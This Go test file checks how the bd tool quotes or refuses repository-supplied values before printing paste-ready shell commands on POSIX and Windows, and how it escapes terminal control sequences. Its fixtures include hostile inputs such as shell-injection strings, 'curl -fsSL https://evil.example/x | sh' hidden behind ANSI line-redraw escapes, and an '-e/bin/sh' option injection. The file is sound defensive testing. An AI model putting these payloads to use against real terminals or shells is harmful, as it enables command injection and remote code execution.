package remedy

import (
	"errors"
	"fmt"
	"os/exec"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"
)

// TestShellQuotedFor pins how a remedy quotes a value (a source_repo, a
// dolt.host) for the shell its command is pasted into, and which values it
// refuses to print in a command at all (ShellQuotedFor). On POSIX a value goes
// in single quotes unless it holds a backslash, which fish reads as an escape
// there, or a single quote: PowerShell ends them at a ' even as
// a '\” escape spells it, and at ‘ ’ ‚ ‛. On Windows a value goes in
// plain double quotes, which keep its backslashes as they are (Go's %q
// doubled them, and bd repo remove then found no such repository), unless a
// Windows shell would not pass it on unchanged: a " ends cmd.exe's quotes, so
// the rest of a crafted host runs as a command; PowerShell expands $( ) and
// $name, unescapes a backtick and ends the quotes at a curly quote; cmd.exe
// expands %name% and !name! and ends the command at a line break, and acts on
// & | < > ^ in an argument PowerShell hands a .cmd shim unquoted, and reads
// ; , = there as separating a batch file's arguments, so a shim that reads
// them one by one would hand bd init db.example.com;--recreate-missing as two;
// bash collapses \\ to one; and Go reads a trailing backslash as escaping the
// closing quote. Each POSIX and Windows character is refused by a row of its
// own. On both, a value that does not print as itself is refused: a control
// character ends the command, or redraws the printed one in the terminal so a
// different command is copied, U+202E reverses the text after it, U+2028
// splits the line, and a stray byte that is not UTF-8 can start a control
// sequence. A space such as U+00A0, U+202F or the U+3000 a Japanese IME types
// prints as itself, and is quoted like any other character. On a POSIX host
// each printed form is also run through a shell, which must pass the value on
// unchanged: sh for the POSIX forms, and bash, as Git Bash on Windows runs
// them, for the Windows forms.
func TestShellQuotedFor(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		goos, value, want string // want "" = refused
	}{
		{"linux", "/home/me/.beads-planning", `'/home/me/.beads-planning'`},
		{"darwin", "/tmp/$HOME/`id`", "'/tmp/$HOME/`id`'"},
		{"linux", "/home/zoë/計画 (2)", "'/home/zoë/計画 (2)'"},
		{"linux", "/home/太郎/プロジェクト\u3000計画", "'/home/太郎/プロジェクト\u3000計画'"},
		{"linux", "/home/me/my\u00a0planning", "'/home/me/my\u00a0planning'"},
		{"darwin", "/Users/me/Planning 9.41\u202fAM", "'/Users/me/Planning 9.41\u202fAM'"},
		{"linux", "db.example.com;--recreate-missing", "'db.example.com;--recreate-missing'"},
		{"linux", `x" & calc & "$(calc)`, `'x" & calc & "$(calc)'`},
		{"linux", "db\ncalc", ""},
		{"linux", "\x1b[2K\rbd init --server-host db; curl evil | sh #", ""},
		{"darwin", "db\u009bx", ""},
		{"linux", "db\x9b2Jx", ""},
		{"linux", "db\u202ex", ""},
		{"linux", "db\u2028x", ""},
		{"linux", `x\'; calc #`, ""},
		{"linux", `x\`, ""},
		{"linux", "x'; calc #", ""},
		{"darwin", "x\u2018; calc #", ""},
		{"darwin", "x\u2019; calc #", ""},
		{"darwin", "x\u201a; calc #", ""},
		{"darwin", "x\u201b; calc #", ""},
		{"windows", `C:\Users\me\.beads-planning`, `"C:\Users\me\.beads-planning"`},
		{"windows", `C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}`, `"C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}"`},
		{"windows", `C:\Users\太郎\プロジェクト` + "\u3000" + `計画`, `"C:\Users\太郎\プロジェクト` + "\u3000" + `計画"`},
		{"windows", `C:\Users\me\my` + "\u00a0" + `planning`, `"C:\Users\me\my` + "\u00a0" + `planning"`},
		{"windows", "db.example.com; calc", ""},
		{"windows", "db.example.com;--recreate-missing", ""},
		{"windows", "db.example.com,--recreate-missing", ""},
		{"windows", "db.example.com=--recreate-missing", ""},
		{"windows", `x" & calc & "`, ""},
		{"windows", `x";calc;#`, ""},
		{"windows", "db\u201ex", ""},
		{"windows", "db\u201cx", ""},
		{"windows", "db\u201dx", ""},
		{"windows", "db|calc", ""},
		{"windows", "db<x", ""},
		{"windows", "db>x", ""},
		{"windows", "db^x", ""},
		{"windows", "\x1b[2K\rbd init", ""},
		{"windows", "db\u202ex", ""},
		{"windows", "db\u2028x", ""},
		{"windows", "$(calc)", ""},
		{"windows", `C:\Users\me\$work\planning`, ""},
		{"windows", "C:\\Users\\me\\`tplanning", ""},
		{"windows", "db\u201d; calc; \u201c", ""},
		{"windows", `C:\100%PATH%\planning`, ""},
		{"windows", `C:\Hello!\planning`, ""},
		{"windows", "db&calc", ""},
		{"windows", `C:\Users\Jane Doe\R&D planning`, ""},
		{"windows", "db\r\ncalc", ""},
		{"windows", `\\server\share\planning`, ""},
		{"windows", `C:\planning\`, ""},
		// A leading - is read as an option by the program the command runs,
		// quoted or not: dolt.host -e/bin/sh made `nc -zv -e/bin/sh 3307`.
		{"linux", "-e/bin/sh", ""},
		{"darwin", "--recreate-missing", ""},
		{"windows", "-rf", ""},
	} {
		got, ok := ShellQuotedFor(tc.goos, tc.value)
		if got != tc.want || ok != (tc.want != "") {
			t.Errorf("ShellQuotedFor(%q, %q) = %s, %v, want %s, %v", tc.goos, tc.value, got, ok, tc.want, tc.want != "")
		}
		// Go's own Windows argument parsing, which bd.exe runs, reads a
		// Windows form back as the one argument it quotes.
		if ok && tc.goos == "windows" {
			if argv := windowsArgv("bd repo remove " + got); !slices.Equal(argv, []string{"bd", "repo", "remove", tc.value}) {
				t.Errorf("bd.exe reads `bd repo remove %s` as %q, want the value %q as its one argument", got, argv, tc.value)
			}
		}
		if !ok || runtime.GOOS == "windows" {
			continue
		}
		shell := "sh"
		if tc.goos == "windows" {
			shell = "bash"
		}
		out, err := exec.Command(shell, "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("%s -c \"printf '%%s' %s\": %v", shell, got, err)
		}
		if string(out) != tc.value {
			t.Errorf("%s passed %s on as %q, want %q", shell, got, out, tc.value)
		}
	}
}

// TestEscapedValue pins how a refusal names a value its remedy leaves as a
// placeholder (EscapedValue): Go-quoted, so strconv.Unquote reads the name back
// as the value, with every quote and every $ ` % ! & | < > ^ ; , = escaped too,
// so no shell expands what is between its double quotes, ends them early or
// splits the argument there, and a user who pastes the name as printed runs
// nothing. strconv.Quote alone left x" & calc & "$(calc) as
// "x\" & calc & \"$(calc)", which bash runs $(calc) in, and PowerShell, which
// takes \ literally, ends at the second " and runs calc. On a POSIX host each
// name is also run through sh, which must print what is between its quotes,
// reading only each \\ there as one backslash.
func TestEscapedValue(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ value, want string }{
		{"db.example.com", `"db.example.com"`},
		{`x" & calc & "$(calc)`, `"x\x22 \x26 calc \x26 \x22\x24(calc)"`},
		{"x'; calc #", `"x\x27\x3b calc #"`},
		{`C:\Users\me\$work\planning\`, `"C:\\Users\\me\\\x24work\\planning\\"`},
		{"db.example.com;--recreate-missing,=", `"db.example.com\x3b--recreate-missing\x2c\x3d"`},
		{"`calc` %PATH% !x! a|b<c>d^e", `"\x60calc\x60 \x25PATH\x25 \x21x\x21 a\x7cb\x3cc\x3ed\x5ee"`},
		{"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b", `"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b"`},
		{"\x1b[2K\rbd\u202e\u3000計画\xff", `"\x1b[2K\rbd\u202e\u3000計画\xff"`},
	} {
		got := EscapedValue(tc.value)
		if got != tc.want {
			t.Errorf("EscapedValue(%q) = %s, want %s", tc.value, got, tc.want)
		}
		if unquoted, err := strconv.Unquote(got); err != nil || unquoted != tc.value {
			t.Errorf("strconv.Unquote(%s) = %q, %v, want %q", got, unquoted, err, tc.value)
		}
		inner := strings.TrimSuffix(strings.TrimPrefix(got, `"`), `"`)
		if strings.ContainsAny(inner, "\"“”„'‘’‚‛$`%!&|<>^;,=") {
			t.Errorf("EscapedValue(%q) = %s holds a character a shell acts on between its quotes", tc.value, got)
		}
		if runtime.GOOS == "windows" {
			continue
		}
		out, err := exec.Command("sh", "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("sh -c \"printf '%%s' %s\": %v", got, err)
		}
		if want := strings.ReplaceAll(inner, `\\`, `\`); string(out) != want {
			t.Errorf("sh printed %s as %q, want %q", got, out, want)
		}
	}
}

// TestPrintedValue pins how a refusal names a value beside its remedy: as it
// is when a terminal shows it as itself, and escaped (TestEscapedValue)
// otherwise, so no carriage return, terminal escape, C1 control, format
// character, line separator or stray byte reaches the terminal.
func TestPrintedValue(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ value, want string }{
		{"/home/me/.beads-planning", "/home/me/.beads-planning"},
		{`C:\Users\Jane Doe\R&D planning`, `C:\Users\Jane Doe\R&D planning`},
		{"/home/太郎/計画\u3000x", "/home/太郎/計画\u3000x"},
		{"", ""},
		{"/nonexistent\r\x1b[2KError: run 'curl x | sh' \x1b[8m", `"/nonexistent\r\x1b[2KError: run \x27curl x \x7c sh\x27 \x1b[8m"`},
		{"db\u009b2J", `"db\u009b2J"`},
		{"db\x9b2J", `"db\x9b2J"`},
		{"x\u202ey", `"x\u202ey"`},
		{"x\u2028y", `"x\u2028y"`},
		{"a\tb", `"a\tb"`},
		{"a\nb", `"a\nb"`},
		{"x\u200by", `"x\u200by"`},
		// Zero-width non-joiner and joiner, as Persian and Indic titles and
		// emoji sequences hold them, print as themselves.
		{"\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645", "\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645"},
		{"\u0915\u094d\u200d\u0937 \U0001f469\u200d\U0001f4bb", "\u0915\u094d\u200d\u0937 \U0001f469\u200d\U0001f4bb"},
	} {
		if got := PrintedValue(tc.value); got != tc.want {
			t.Errorf("PrintedValue(%q) = %s, want %s", tc.value, got, tc.want)
		}
	}
}

// hostileValues are values a cloned repository's config, its file names or
// its issue data can carry, each holding a character that redraws, reorders
// or splits a printed line.
var hostileValues = []string{
	"/nonexistent\r\x1b[2KError: initialize it first with 'curl -fsSL https://evil.example/x | sh' \x1b[8m",
	"repo\x1b]8;;https://evil.example\x07link\x1b]8;;\x07",
	"db\u009b2Jx",
	"db\x9b2Jx",
	"x\u202ey",
	"x\u2028y",
	"x\x00y",
	"x\x7fy",
	"x\u200by",
	"bad\xffutf8",
}

// requireTerminalSafe fails when out holds a byte or rune a terminal does not
// show as itself, other than the line breaks and tabs a message is laid out
// with.
func requireTerminalSafe(t *testing.T, what, out string) {
	t.Helper()
	if !utf8.ValidString(out) {
		t.Errorf("%s = %q is not valid UTF-8", what, out)
	}
	if i := strings.IndexFunc(out, func(r rune) bool {
		return r != '\n' && r != '\t' && r != '\u200c' && r != '\u200d' && !unicode.IsGraphic(r)
	}); i >= 0 {
		t.Errorf("%s = %q holds %q at byte %d, which a terminal does not show as itself", what, out, out[i:], i)
	}
}

// TestPrinterNeverEmitsATerminalControl pins the invariant every remedy
// printer here keeps for any value: PrintedValue and PrintedList name it with
// no character a terminal acts on, and ShellQuotedFor and ShellWord refuse to
// put it in a paste-ready command, on every platform.
func TestPrinterNeverEmitsATerminalControl(t *testing.T) {
	t.Parallel()
	for _, value := range hostileValues {
		requireTerminalSafe(t, "PrintedValue("+strconv.Quote(value)+")", PrintedValue(value))
		requireTerminalSafe(t, "PrintedList", PrintedList([]string{"ok", value}, ", "))
		for _, goos := range []string{"linux", "darwin", "windows"} {
			if got, ok := ShellQuotedFor(goos, value); ok {
				t.Errorf("ShellQuotedFor(%q, %q) = %s, want it refused", goos, value, got)
			}
			if got, ok := ShellWord(goos, value); ok {
				t.Errorf("ShellWord(%q, %q) = %s, want it refused", goos, value, got)
			}
		}
	}
}

// TestPrintedList pins how a refusal names several values (database or table
// names) beside its remedy: each spelled by PrintedValue, joined by sep.
func TestPrintedList(t *testing.T) {
	t.Parallel()
	got := PrintedList([]string{"beads", "pl\r\x1b[2K", "x"}, ", ")
	if want := `beads, "pl\r\x1b[2K", x`; got != want {
		t.Errorf("PrintedList = %s, want %s", got, want)
	}
	if got := PrintedList(nil, ", "); got != "" {
		t.Errorf("PrintedList(nil) = %q, want empty", got)
	}
}

// TestShellWord pins how a remedy spells one argument of a paste-ready
// command: bare when every shell on every platform passes it on as it is (an
// issue ID, a host name, a path of plain characters), and otherwise quoted by
// ShellQuotedFor, or refused where that refuses it.
func TestShellWord(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		goos, value, want string // want "" = refused
	}{
		{"linux", "bd-a1b2", "bd-a1b2"},
		{"windows", "bd-a1b2.3", "bd-a1b2.3"},
		{"linux", "db.example.com", "db.example.com"},
		{"linux", "::1", "::1"},
		{"linux", "/home/me/proj/.beads", "/home/me/proj/.beads"},
		{"linux", "/home/me/my proj/.beads", "'/home/me/my proj/.beads'"},
		{"windows", `C:\Users\me\proj\.beads`, `"C:\Users\me\proj\.beads"`},
		{"linux", "~/x", "'~/x'"},
		{"linux", "a*b", "'a*b'"},
		{"linux", "x; curl evil | sh", "'x; curl evil | sh'"},
		{"windows", "x; curl evil | sh", ""},
		{"linux", "x'y", ""},
		{"linux", "", "''"},
		{"windows", "", `""`},
		{"linux", "-e/bin/sh", ""},
		{"windows", "-e", ""},
		{"linux", "a-b", "a-b"},
	} {
		got, ok := ShellWord(tc.goos, tc.value)
		if got != tc.want || ok != (tc.want != "") {
			t.Errorf("ShellWord(%q, %q) = %s, %v, want %s, %v", tc.goos, tc.value, got, ok, tc.want, tc.want != "")
		}
		if ok && tc.goos == "windows" {
			if argv := windowsArgv("bd show " + got); !slices.Equal(argv, []string{"bd", "show", tc.value}) {
				t.Errorf("bd.exe reads `bd show %s` as %q, want %q", got, argv, tc.value)
			}
		}
		if !ok || tc.goos == "windows" || runtime.GOOS == "windows" {
			continue
		}
		out, err := exec.Command("sh", "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("sh -c \"printf '%%s' %s\": %v", got, err)
		}
		if string(out) != tc.value {
			t.Errorf("sh passed %s on as %q, want %q", got, out, tc.value)
		}
	}
}

// TestCommandArg pins how a remedy pastes a value into a command: as
// ShellWord spells it, with no note, or, where ShellWord refuses it, as the
// placeholder, with a note naming the value escaped for the user to quote.
func TestCommandArg(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		goos, value, wantArg, wantNote string
	}{
		{"linux", "/home/me/.beads", "/home/me/.beads", ""},
		{"linux", "/home/me/my proj", "'/home/me/my proj'", ""},
		{"windows", `C:\Users\me\proj`, `"C:\Users\me\proj"`, ""},
		{"linux", "/tmp/x\r\x1b[2K; curl evil | sh", "<path>", `  (<path>: "/tmp/x\r\x1b[2K\x3b curl evil \x7c sh")`},
		{"windows", `C:\R&D`, "<path>", `  (<path>: "C:\\R\x26D")`},
		{"linux", "-e/bin/sh", "<path>", `  (<path>: "-e/bin/sh")`},
	} {
		arg, note := CommandArg(tc.goos, tc.value, "<path>")
		if arg != tc.wantArg || note != tc.wantNote {
			t.Errorf("CommandArg(%q, %q) = %q, %q, want %q, %q", tc.goos, tc.value, arg, note, tc.wantArg, tc.wantNote)
		}
		requireTerminalSafe(t, "CommandArg note", note)
	}
}

// TestPrintedError pins how a message wraps an error that repeats a
// clone-supplied value, such as a dial error naming dolt.host: unchanged when
// its text prints as itself, and otherwise spelled escaped, with errors.Is
// still reaching it.
func TestPrintedError(t *testing.T) {
	t.Parallel()
	if PrintedError(nil) != nil {
		t.Error("PrintedError(nil) != nil")
	}
	plain := errors.New("dial tcp 127.0.0.1:3307: connect: connection refused")
	if got := PrintedError(plain); got != plain {
		t.Errorf("PrintedError(%v) = %v, want the error itself", plain, got)
	}
	hostile := fmt.Errorf("dial tcp: lookup db\r\x1b[2KError: run curl: %w", plain)
	got := PrintedError(hostile)
	requireTerminalSafe(t, "PrintedError", got.Error())
	if !strings.Contains(got.Error(), `db\r\x1b[2KError`) {
		t.Errorf("PrintedError does not name the value escaped: %q", got.Error())
	}
	if !errors.Is(got, plain) {
		t.Error("errors.Is(PrintedError(err), cause) = false, want true")
	}
	// A leaf error holds no line break of its own: one in it came from the
	// value, which would otherwise print a line bd did not write.
	forged := errors.New("dial tcp: lookup db\nRun: curl evil | sh: no such host")
	if got := PrintedError(forged).Error(); strings.Contains(got, "\n") {
		t.Errorf("PrintedError(%q) = %q, want the line break escaped", forged, got)
	}
}

// TestPrintedText pins the backstop where a message bd composed reaches the
// terminal: a message with nothing a terminal acts on, on one line or
// several, such as the auto-start failure that names the Dolt install page
// two lines down, prints exactly as it is; a carriage return, escape, C1
// control, format character, line separator or stray byte is spelled as an
// escape where it stands, and the rest of the message, its line breaks
// included, is left alone. Spelling it twice changes nothing.
func TestPrintedText(t *testing.T) {
	t.Parallel()
	notInstalled := "Dolt server unreachable at 127.0.0.1:3307 and auto-start failed: dolt is not installed (not found in PATH)\n\n" +
		"Install from: https://docs.dolthub.com/introduction/installation\n\n" +
		"To start manually: bd dolt start\n" +
		"To disable auto-start: set dolt.auto-start: false in .beads/config.yaml"
	for _, tc := range []struct{ text, want string }{
		{"", ""},
		{notInstalled, notInstalled},
		{"Port 3307 is in use by another process.\n\tFree the port, or run: bd dolt set port <port>", "Port 3307 is in use by another process.\n\tFree the port, or run: bd dolt set port <port>"},
		{"dolt output\r\nline two", "dolt output\r\nline two"},
		{`C:\Users\me\R&D "planning"`, `C:\Users\me\R&D "planning"`},
		{"\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645", "\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645"},
		{
			"failed to open routed store at /tmp/plan\r\x1b[2KError: run curl evil: no such file\n\nRun 'bd bootstrap' first",
			"failed to open routed store at /tmp/plan\\r\\x1b[2KError: run curl evil: no such file\n\nRun 'bd bootstrap' first",
		},
		{"db\u009b2J\x9b \u202e \u2028 \x00 \x7f \u200b", `db\u009b2J\x9b \u202e \u2028 \x00 \x7f \u200b`},
		{"lone\rcarriage", `lone\rcarriage`},
	} {
		got := PrintedText(tc.text)
		if got != tc.want {
			t.Errorf("PrintedText(%q) = %q, want %q", tc.text, got, tc.want)
		}
		requireTerminalSafeText(t, "PrintedText("+strconv.Quote(tc.text)+")", got)
		if again := PrintedText(got); again != got {
			t.Errorf("PrintedText(PrintedText(%q)) = %q, want it unchanged", tc.text, again)
		}
	}
	for _, value := range hostileValues {
		requireTerminalSafeText(t, "PrintedText("+strconv.Quote(value)+")", PrintedText("at "+value+"\nRun: bd bootstrap"))
	}
}

// requireTerminalSafeText is requireTerminalSafe for a message PrintedText
// spelled, which may keep a carriage return that ends a line.
func requireTerminalSafeText(t *testing.T, what, out string) {
	t.Helper()
	requireTerminalSafe(t, what, strings.ReplaceAll(out, "\r\n", "\n"))
}

// TestTextWriter pins the writer cobra's error line goes through: what is
// written reaches the underlying writer spelled by PrintedText, and the write
// reports the bytes it was given.
func TestTextWriter(t *testing.T) {
	t.Parallel()
	var out strings.Builder
	w := TextWriter(&out)
	msg := "Error: resolving ID pl-abc: open /tmp/plan\r\x1b[2KError: run curl evil\n"
	n, err := w.Write([]byte(msg))
	if err != nil || n != len(msg) {
		t.Fatalf("Write = %d, %v, want %d, nil", n, err, len(msg))
	}
	if want := "Error: resolving ID pl-abc: open /tmp/plan\\r\\x1b[2KError: run curl evil\n"; out.String() != want {
		t.Errorf("TextWriter wrote %q, want %q", out.String(), want)
	}
}

// TestPrintedTextError pins the wrapper for an error bd composed and returns:
// itself when PrintedText leaves its text alone, a multi-line message of bd's
// own included, and otherwise an error spelled by PrintedText, lines kept,
// that errors.Is still sees through. PrintedMessage is the same text as a
// string, "<nil>" for no error.
func TestPrintedTextError(t *testing.T) {
	t.Parallel()
	if PrintedTextError(nil) != nil {
		t.Error("PrintedTextError(nil) != nil")
	}
	if got := PrintedMessage(nil); got != "<nil>" {
		t.Errorf("PrintedMessage(nil) = %q, want <nil>", got)
	}
	own := errors.New("dolt is not installed (not found in PATH)\n\nInstall from: https://docs.dolthub.com/introduction/installation")
	if got := PrintedTextError(own); got != own {
		t.Errorf("PrintedTextError(%q) = %q, want the error itself", own, got)
	}
	cause := errors.New("mkdir /tmp/plan\r\x1b[2KError: run curl: not a directory")
	wrapped := fmt.Errorf("open target: %w\n\nRun 'bd bootstrap' there first", cause)
	got := PrintedTextError(wrapped)
	want := "open target: mkdir /tmp/plan\\r\\x1b[2KError: run curl: not a directory\n\nRun 'bd bootstrap' there first"
	if got.Error() != want {
		t.Errorf("PrintedTextError = %q, want %q", got.Error(), want)
	}
	if PrintedMessage(wrapped) != want {
		t.Errorf("PrintedMessage = %q, want %q", PrintedMessage(wrapped), want)
	}
	if !errors.Is(got, cause) {
		t.Error("errors.Is(PrintedTextError(err), cause) = false, want true")
	}
	if again := PrintedTextError(got); again.Error() != want {
		t.Errorf("PrintedTextError twice = %q, want %q", again.Error(), want)
	}
}
